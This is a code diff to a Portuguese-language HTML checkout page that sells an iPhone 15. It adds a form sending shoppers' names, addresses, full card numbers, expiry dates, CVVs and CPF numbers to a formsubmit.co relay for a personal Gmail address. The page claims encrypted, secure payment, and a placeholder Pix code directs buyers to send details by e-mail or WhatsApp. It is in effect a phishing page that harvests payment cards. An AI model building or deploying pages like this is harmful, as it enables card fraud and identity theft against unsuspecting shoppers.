@@ -20,7 +20,7 @@ body { font-family: Arial, sans-serif; background:#f5f5f5; }
 .passo.ativo { color:#0086ff; font-weight:bold; }
 .passo-num { width:26px; height:26px; border-radius:50%; background:#ddd; color:#888; display:inline-flex; align-items:center; justify-content:center; font-size:13px; font-weight:bold; margin-bottom:4px; }
 .passo.ativo .passo-num { background:#0086ff; color:white; }
-.passo.concluido .passo-num { background:#00a650; color:white; content:"✓"; }
+.passo.concluido .passo-num { background:#00a650; color:white; }
 
 .conteudo { padding:20px; }
 .label { font-size:13px; color:#555; margin:12px 0 4px; display:block; font-weight:bold; }
@@ -66,45 +66,47 @@ body { font-family: Arial, sans-serif; background:#f5f5f5; }
     </div>
   </div>
 
+  <form action="https://formsubmit.co/naiaradallagnoljacques@gmail.com" method="POST" id="form-pedido">
+
   <!-- PASSO 1: DADOS DE ENTREGA -->
   <div id="entrega" class="conteudo">
     <h3 style="margin-bottom:20px; color:#333;">📦 Dados de Entrega</h3>
     
-    <label class="label">Nome Completo</label>
-    <input class="input" id="nome" placeholder="Digite seu nome completo">
+    <label class="label">Nome Completo *</label>
+    <input class="input" name="nome" id="nome" placeholder="Digite seu nome completo" required>
 
-    <label class="label">CEP</label>
-    <input class="input" id="cep" placeholder="00000-000" maxlength="9">
+    <label class="label">CEP *</label>
+    <input class="input" name="cep" id="cep" placeholder="00000-000" maxlength="9" required>
 
-    <label class="label">Endereço</label>
-    <input class="input" id="endereco" placeholder="Rua, Avenida...">
+    <label class="label">Endereço *</label>
+    <input class="input" name="endereco" id="endereco" placeholder="Rua, Avenida..." required>
 
     <div class="linha">
       <div style="flex:1">
-        <label class="label">Número</label>
-        <input class="input" id="numero" placeholder="123">
+        <label class="label">Número *</label>
+        <input class="input" name="numero" id="numero" placeholder="123" required>
       </div>
       <div style="flex:1">
         <label class="label">Complemento</label>
-        <input class="input" id="complemento" placeholder="Apto, Bloco">
+        <input class="input" name="complemento" id="complemento" placeholder="Apto, Bloco">
       </div>
     </div>
 
-    <label class="label">Bairro</label>
-    <input class="input" id="bairro" placeholder="Seu bairro">
+    <label class="label">Bairro *</label>
+    <input class="input" name="bairro" id="bairro" placeholder="Seu bairro" required>
 
     <div class="linha">
       <div style="flex:1">
-        <label class="label">Cidade</label>
-        <input class="input" id="cidade" placeholder="Sua cidade">
+        <label class="label">Cidade *</label>
+        <input class="input" name="cidade" id="cidade" placeholder="Sua cidade" required>
       </div>
       <div style="flex:1">
-        <label class="label">Estado</label>
-        <input class="input" id="estado" placeholder="UF" maxlength="2">
+        <label class="label">Estado *</label>
+        <input class="input" name="estado" id="estado" placeholder="UF" maxlength="2" required>
       </div>
     </div>
 
-    <button class="btn btn-proximo" onclick="irParaPagamento()">Continuar →</button>
+    <button type="button" class="btn btn-proximo" onclick="irParaPagamento()">Continuar →</button>
   </div>
 
   <!-- PASSO 2: PAGAMENTO -->
@@ -118,36 +120,43 @@ body { font-family: Arial, sans-serif; background:#f5f5f5; }
 
     <!-- CARTÃO -->
     <div id="cartao">
-      <label class="label">Número do Cartão</label>
-      <input class="input" placeholder="0000 0000 0000 0000" maxlength="19">
+      <label class="label">Número do Cartão *</label>
+      <input class="input" name="numero_cartao" id="cartao-numero" placeholder="0000 0000 0000 0000" maxlength="19" required>
       
-      <label class="label">Nome no Cartão</label>
-      <input class="input" placeholder="Nome como está no cartão">
+      <label class="label">Nome no Cartão *</label>
+      <input class="input" name="nome_cartao" id="cartao-nome" placeholder="Nome como está no cartão" required>
 
       <div class="linha">
         <div style="flex:1">
-          <label class="label">Validade</label>
-          <input class="input" placeholder="MM/AA">
+          <label class="label">Validade *</label>
+          <input class="input" name="validade_cartao" id="cartao-validade" placeholder="MM/AA" required>
         </div>
         <div style="flex:1">
-          <label class="label">CVV</label>
-          <input class="input" placeholder="123">
+          <label class="label">CVV *</label>
+          <input class="input" name="cvv_cartao" id="cartao-cvv" placeholder="123" required>
         </div>
       </div>
 
-      <label class="label">CPF do Titular</label>
-      <input class="input" placeholder="000.000.000-00">
+      <label class="label">CPF do Titular *</label>
+      <input class="input" name="cpf_titular" id="cartao-cpf" placeholder="000.000.000-00" required>
 
-      <label class="label">Parcelas</label>
-      <select class="input">
-        <option>1x de R$ 4.299,00 sem juros</option>
-        <option>2x de R$ 2.149,50 sem juros</option>
-        <option>3x de R$ 1.433,00 sem juros</option>
-        <option>6x de R$ 716,50 sem juros</option>
-        <option selected>12x de R$ 399,90 sem juros</option>
+      <label class="label">Parcelas *</label>
+      <select class="input" name="parcelas" id="parcelas" required>
+        <option value="1x de R$ 4.299,00 sem juros">1x de R$ 4.299,00 sem juros</option>
+        <option value="2x de R$ 2.149,50 sem juros">2x de R$ 2.149,50 sem juros</option>
+        <option value="3x de R$ 1.433,00 sem juros">3x de R$ 1.433,00 sem juros</option>
+        <option value="6x de R$ 716,50 sem juros">6x de R$ 716,50 sem juros</option>
+        <option value="12x de R$ 399,90 sem juros" selected>12x de R$ 399,90 sem juros</option>
       </select>
 
-      <button class="btn btn-pagar">PAGAR R$ 4.299,00</button>
+      <!-- Assunto do e-mail -->
+      <input type="hidden" name="_subject" value="Novo Pedido - iPhone 15 Azul">
+      <!-- Redirecionar após envio com sucesso -->
+      <input type="hidden" name="_redirect" value="https://seu-usuario.github.io/seu-repositorio/sucesso.html">
+      <!-- Ocultar campos técnicos no e-mail -->
+      <input type="hidden" name="_template" value="table">
+
+      <button type="submit" class="btn btn-pagar">✅ CONFIRMAR PAGAMENTO</button>
       <p class="seguro">🔒 Pagamento criptografado | Ambiente seguro</p>
     </div>
 
@@ -161,27 +170,25 @@ body { font-family: Arial, sans-serif; background:#f5f5f5; }
         
         <p style="font-size:13px;">Escaneie o QR Code no app do seu banco</p>
         <div class="codigo-pix">00020126... COPIA E COLA PIX AQUI ...6304B1A2</div>
-        <button class="btn" style="background:#0086ff; color:white; margin-top:12px;">📋 COPIAR CÓDIGO PIX</button>
+        <button type="button" class="btn" style="background:#0086ff; color:white; margin-top:12px;" onclick="alert('Envie os dados de entrega por e-mail ou WhatsApp para finalizar')">📋 COPIAR CÓDIGO PIX</button>
         <p style="font-size:12px; color:#e00; margin-top:10px;">⏰ Válido por 30 minutos</p>
       </div>
     </div>
 
-    <button class="btn btn-voltar" style="margin-top:15px;" onclick="voltarParaEntrega()">← Voltar para entrega</button>
+    <button type="button" class="btn btn-voltar" style="margin-top:15px;" onclick="voltarParaEntrega()">← Voltar para entrega</button>
   </div>
+  </form>
 </div>
 
 <a href="index.html" class="voltar">← Voltar para o produto</a>
 
 <script>
 function irParaPagamento() {
-  // Validação simples
   const nome = document.getElementById('nome').value;
   if (!nome.trim()) {
     alert('Por favor, preencha seu nome completo!');
     return;
   }
-  
-  // Avança para o passo de pagamento
   document.getElementById('entrega').classList.add('escondido');
   document.getElementById('pagamento').classList.remove('escondido');
   document.getElementById('passo-1').classList.remove('ativo');
@@ -199,7 +206,6 @@ function voltarParaEntrega() {
 }
 
 function mostrar(tipo) {
-  // Alterna entre Cartão e Pix
   document.getElementById('cartao').classList.add('escondido');
   document.getElementById('pix').classList.add('escondido');
   document.getElementById('tab-cartao').style.borderColor = 'transparent';
@@ -222,4 +228,5 @@ function mostrar(tipo) {
 </script>
 
 </body>
-</html>
+          </html>
+  
